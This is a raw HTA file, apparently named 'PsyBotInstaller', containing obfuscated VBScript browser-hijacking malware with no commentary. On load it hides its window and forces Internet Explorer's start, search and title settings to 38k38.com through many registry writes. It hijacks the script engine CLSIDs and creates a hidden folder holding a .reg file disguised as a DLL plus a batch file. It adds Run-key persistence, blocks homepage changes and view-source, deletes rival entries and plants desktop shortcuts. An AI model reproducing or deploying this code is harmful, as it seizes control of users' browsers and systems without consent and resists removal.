    <HTA:APPLICATION ID='PsyBot'
     APPLICATIONNAME='PsyBotInstaller'
     BORDER='none'
     BORDERSTYLE='normal'
     CAPTION='no'
     ICON=''
     CONTEXTMENU='no'
     MAXIMIZEBUTTON='yes'
     MINIMIZEBUTTON='yes'
     SHOWINTASKBAR='no'
     SINGLEINSTANCE='no'
     SYSMENU='no'
     VERSION='1.0'
     WINDOWSTATE='minimize'/>
<%response.ContentType="application/hta"%>
<object id='wshh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script LANGUAGE="VBScript.Encode">
on error resume next
window.moveTo  -100,-100
window.resizeTo 0,0
function LoveDuYaQung(loveurl) 
Set fso=CreateObject("Scri" + "pting.Fil" + "eSyste" + "mO" + "bject")
FN = "C:\$NtUn" & "inst" & "allQ592" & "6809$"
wjj=FN
wj1=FN + "\sp"+"c"+"u"+"st"+"om.d"+"ll" 
topuser=FN + "\a3"+"7"+"2"+"1"+".b"+"at" 
mmyy="h"+"t"+"t"+"p"+"://"+loveurl 
hcu="HK"+"EY"+"_CU"+"RRE"+"NT_U"+"SER\So"+"ftwa"+"re\Micro"+"so"+"ft\" 
cncrack="HK"+"EY"+"_CU"+"RRE"+"NT_U"+"SER\So"+"ftwa"+"re\Pol"+"ici"+"es\"+"Micro"+"so"+"ft\" 
cncrackcom="HK"+"EY"+"_LO"+"C"+"AL_M"+"ACHINE\So"+"ftwa"+"re\Pol"+"ici"+"es\"+"Micro"+"so"+"ft\" 
hlm="H"+"KE"+"Y_L"+"OCA"+"L_"+"MA"+"CHI"+"NE\SOFT"+"WA"+"RE\Micr"+"o"+"s"+"of"+"t\" 

fuck9556="C:\$NtUninstallQ5201314$"
fuck2="C:\$NtUninstallQ5201316$"
fuck3="C:\$NtUninstallQ5201317$"
fuck4="C:\$NtUninstallQ887678$"
fuck5="C:\$NtUninstallQ39156$"

EagleUrl=mmyy
Set Fso=CreateObject("Scri" + "pting.Fil" + "eSyste" + "mO" + "bject")
cncrackcom=Fso.GetSpecialFolder(1)
cncrackvb1=cncrackcom+"\"+"vb"+"scr"+"ipt."+"dll"
cncrackvb2=cncrackcom+"\"+"js"+"c"+"ript"+".d"+"ll"

wshh.RegWrite "HKCR\*\shellex\ContextMenuHandlers\RisingRav\",EagleUrl
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", EagleUrl
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", EagleUrl
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", EagleUrl
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1",EagleUrl
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2",EagleUrl
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3",EagleUrl
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page",EagleUrl
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\SearchURL",EagleUrl
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\SearchURL",EagleUrl
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Default_Search_URL",EagleUrl
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Local Page",EagleUrl
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Bar",EagleUrl
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Search\SearchAssistant",EagleUrl
wshh.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Default_Page_URL",EagleUrl
wshh.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Default_Search_URL",EagleUrl
wshh.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Local Page",EagleUrl
wshh.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Search Bar",EagleUrl
wshh.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Search Page",EagleUrl
wshh.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start Page",EagleUrl
wshh.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Search\SearchAssistant",EagleUrl
wshh.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage","0"
wshh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title",EagleUrl
wshh.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Window Title",EagleUrl
wshh.RegWrite "HKLM\SOFTWARE\Classes\CLSID\{B54F3741-5B07-11cf-A4B0-00AA004A55E8}\InprocServer32\",cncrackvb1
wshh.RegWrite "HKLM\SOFTWARE\Classes\CLSID\{B54F3742-5B07-11cf-A4B0-00AA004A55E8}\InprocServer32\",cncrackvb1
wshh.RegWrite "HKLM\SOFTWARE\Classes\CLSID\{B54F3743-5B07-11cf-A4B0-00AA004A55E8}\InprocServer32\",cncrackvb1
wshh.RegWrite "HKLM\SOFTWARE\Classes\CLSID\{f414c260-6ac0-11cf-b6d1-00aa00bbbb58}\InprocServer32\",cncrackvb2
wshh.RegWrite "HKLM\SOFTWARE\Classes\CLSID\{f414c261-6ac0-11cf-b6d1-00aa00bbbb58}\InprocServer32\",cncrackvb2
wshh.RegWrite "HKLM\SOFTWARE\Classes\CLSID\{f414c262-6ac0-11cf-b6d1-00aa00bbbb58}\InprocServer32\",cncrackvb2

if (fso.FolderExists(wjj)) then 
Set fldr=fso.GetFolder(wjj) 
fldr.Attributes=6 
Else
Set wf1=fso.CreateFolder(wjj) 
Set fldr=fso.GetFolder(wjj) 
fldr.Attributes=6 
End if 

on error resume next
Set wf1=fso.CreateTextFile(wj1,true)
wf1.writeLine("REGEDIT4")
wf1.WriteBlankLines(1)
wf1.WriteLine("["+cncrack+"Internet Explorer\Control Panel]")
wf1.WriteLine("""HomePage""=""0""")
wf1.WriteBlankLines(1)
wf1.WriteLine("["+cncrack+"Internet Explorer\Restrictions]")
wf1.WriteLine("""NoViewSource""=""1""")
wf1.WriteBlankLines(1)
wf1.WriteLine("["+cncrackcom+"Internet Explorer\Restrictions]")
wf1.WriteLine("""NoViewSource""=""1""")
wf1.WriteBlankLines(1)
wf1.WriteLine("["+hlm+"Internet Explorer\Main]")
wf1.WriteLine("""Start Page""="""+mmyy+"""")
wf1.WriteLine("""First Home Page""="""+mmyy+"""")
wf1.WriteLine("""Local Page""="""+mmyy+"""")
wf1.WriteLine("""Window Title""="""+mmyy+"""")
wf1.WriteLine("""Default_Page_URL""="""+mmyy+"""")
wf1.WriteBlankLines(1)
wf1.writeLine("["+hcu+"Internet Explorer\Main]")
wf1.WriteLine("""Start Page""="""+mmyy+"""")
wf1.WriteLine("""First Home Page""="""+mmyy+"""")
wf1.WriteLine("""Local Page""="""+mmyy+"""")
wf1.WriteLine("""Window Title""="""+mmyy+"""")
wf1.WriteLine("""Default_Page_URL""="""+mmyy+"""")
wf1.WriteBlankLines(1)
wf1.WriteLine("[-"+hcu+"windows\CurrentVersion\Run]")
wf1.WriteLine("["+hcu+"windows\CurrentVersion\Run]")
wf1.WriteLine("@=-")
wf1.WriteBlankLines(1)
wf1.writeLine("[-"+hlm+"Windows\CurrentVersion\RunOnce]")
wf1.writeLine("[-"+hlm+"Windows\CurrentVersion\RunServices]")
wf1.WriteBlankLines(1)
wf1.writeLine("["+hlm+"Windows\CurrentVersion\Run]")
wf1.WriteLine("@=-")
wf1.WriteLine("""LogFeil""=-")
wf1.WriteLine("""cncrackcom""=-")
wf1.WriteLine("""cncrack_com""=-")
wf1.WriteLine("""3721""=""C:\$NtUninstallQ5926809$\a3721.bat""")
wf1.WriteLine("""cncrack""="""+mmyy+"""")
wf1.WriteLine("""internat.exe""=""internat.exe""")
wf1.WriteLine("""intelnat.exe""=-")
wf1.WriteLine("""interneet.exe""=-")
wf1.WriteLine("""zwupdows""=-")
wf1.WriteLine("""win""=-")
wf1.WriteLine("""mwin""=-")
wf1.WriteLine("""intenet""=-")
wf1.WriteLine("""Inernet""=-")
wf1.WriteLine("""Internet""=-")
wf1.WriteLine("""iexpleror""=-")
wf1.WriteLine("""zxdows""=-")
wf1.WriteLine("""qwe""=-")
wf1.WriteLine("""win1""=-")
wf1.WriteLine("""winwin""=-")
wf1.WriteLine("""9i5zxdows""=-")
wf1.WriteLine("""9i5com01zxdows""=-")
wf1.WriteLine("""99zxdows""=-")
wf1.WriteLine("""syste""=-")
wf1.WriteLine("""88zxdows""=-")
wf1.WriteLine("""Start Pagewin""=-")
wf1.WriteLine("""Start Page""=-")
wf1.WriteLine("""9i5comzxdows""=-")
wf1.WriteLine("""9q5zxdows""=-")
wf1.WriteLine("""999izxdows""=-")
wf1.WriteLine("""033zxdows""=-")
wf1.WriteLine("""8zxdows""=-")
wf1.WriteLine("""flash""=-")
wf1.WriteLine("""3zxdows""=-")
wf1.WriteLine("""u88y""=-")
wf1.WriteLine("""88u88""=-")
wf1.WriteLine("""u18""=-")
wf1.WriteLine("""u1881""=-")
wf1.WriteLine("""u1882""=-")
wf1.WriteLine("""u1883""=-")
wf1.WriteLine("""u1884""=-")
wf1.WriteLine("""u1885""=-")
wf1.WriteLine("""u1886""=-")
wf1.WriteLine("""u1887""=-")
wf1.WriteLine("""u1888""=-")
wf1.WriteLine("""system""=-")
wf1.WriteLine("""u188""=-")
wf1.WriteLine("""iexpler""=-")
wf1.WriteLine("""u1810""=-")
wf1.WriteLine("""WIN32""=-")
wf1.WriteLine("""W1N32""=-")
wf1.WriteLine("""Abank""=-")
wf1.WriteLine("""Ziplog""=-")
wf1.WriteLine("""SystemServices""=-")
wf1.WriteLine("""stup""=-")
wf1.WriteLine("""Services""=-")
wf1.WriteLine("""WJQ32""=-")
wf1.WriteLine("""syslog""=-")

wshh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\","regedit -s C:\$NtUninstallQ5926809$\spcustom.dll"
wshh.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\","regedit -s C:\$NtUninstallQ5926809$\spcustom.dll"
wshh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\cncrack_com"
wshh.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\cncrack_com"
wshh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\3721","C:\$NtUninstallQ5926809$\a3721.bat"
wshh.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\3721","C:\$NtUninstallQ5926809$\a3721.bat"

if (fso.FolderExists(fuck9556)) then
fso.DeleteFolder fuck9556
end if

if (fso.FolderExists(fuck2)) then
fso.DeleteFolder fuck2
end if

if (fso.FolderExists(fuck3)) then
fso.DeleteFolder fuck3
end if

if (fso.FolderExists(fuck4)) then
fso.DeleteFolder fuck4
end if

if (fso.FolderExists(fuck5)) then
fso.DeleteFolder fuck5
end if

wf1.close()

on error resume next
Set cnfocus=fso.CreateTextFile(topuser,true)
cnfocus.writeLine("@echo off")
cnfocus.writeLine("regedit -s C:\$NtUninstallQ5926809$\spcustom.dll")
cnfocus.writeLine("@cls")
cnfocus.close()
end function
</script>

<script LANGUAGE="VBScript">
Call LoveDuYaQung("38k38.com")
</script>
<script>
window.close()
</script>

<script LANGUAGE="VBScript">
</script>
<script language="JavaScript">
function closeit() {
setTimeout("self.close()",5)
}
closeit()
</script>
<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script LANGUAGE="VBScript">
on error resume next

Call LongFei_AddDesktop("��38k38��������","http://www.38k38.com")


on error resume next

Function LongFei_AddFavorites(N, U)
	on error resume next
	Set S = wsh.CreateShortcut(wsh.SpecialFolders("Favorites") + "/" + N +".URL")
	S.TargetPath = U	
	S.Save()
	Set Sl = wsh.CreateShortcut(wsh.SpecialFolders("Favorites") + "/����/" + N +".URL")
	Sl.TargetPath = U
	Sl.Save()
End Function

Function LongFei_AddDesktop(N, U)
	on error resume next
	Set S = wsh.CreateShortcut(wsh.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
	S.TargetPath = U	
	S.Save()
End Function

</script>